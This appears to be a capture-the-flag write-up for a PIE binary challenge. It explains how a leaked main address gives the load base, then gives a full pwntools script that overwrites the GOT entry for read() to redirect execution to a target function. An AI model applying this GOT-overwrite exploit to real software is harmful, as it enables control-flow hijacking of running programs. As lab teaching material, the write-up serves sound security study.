# 🔑 Write-Up

This challenge is very similar to the previous but this time we have a PIE executable so we don't know where the GOT will be when the program is loaded in memory. Luckily the program leaks the address of the start of the main function, using that we can calculate the random offset at which the executable is loaded and thus obtain the addresses of the GOT and of out target function. We can then use those addresses to pwn the binary in the same way as the previous challenge.

```python
from pwn import *

context.binary = "./challenge"
p = process()

e = context.binary
p = process()

main_address = p.u32()

log.info(f"leaked main address {hex(main_address)}")

base_address = main_address - e.functions["main"].address

log.info(f"executable base {hex(base_address)}")

e.address += base_address

log.info(f"read() address {hex(e.got['read'])}")
log.info(f"target function address {hex(e.functions['oh_look_useful'].address)}")

p.send(p32(e.got["read"]))
p.send(p32(e.functions["oh_look_useful"].address))
p.recvline()
p.interactive()
```